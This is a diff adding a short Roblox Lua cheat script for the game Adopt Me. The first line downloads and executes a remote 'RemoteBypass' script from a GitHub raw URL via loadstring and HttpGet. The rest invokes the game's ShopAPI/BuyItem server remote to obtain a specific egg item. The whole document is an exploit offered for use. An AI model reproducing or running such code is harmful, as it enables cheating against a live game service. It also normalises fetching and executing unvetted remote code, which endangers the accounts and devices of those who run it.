@@ -1,0 +1,9 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(0.1)
+local args = {
+    [1] = "pets",
+    [2] = "aztec_egg_2025_royal_aztec_egg", 
+    [3] = {}
+}
+
+game:GetService("ReplicatedStorage").API:FindFirstChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
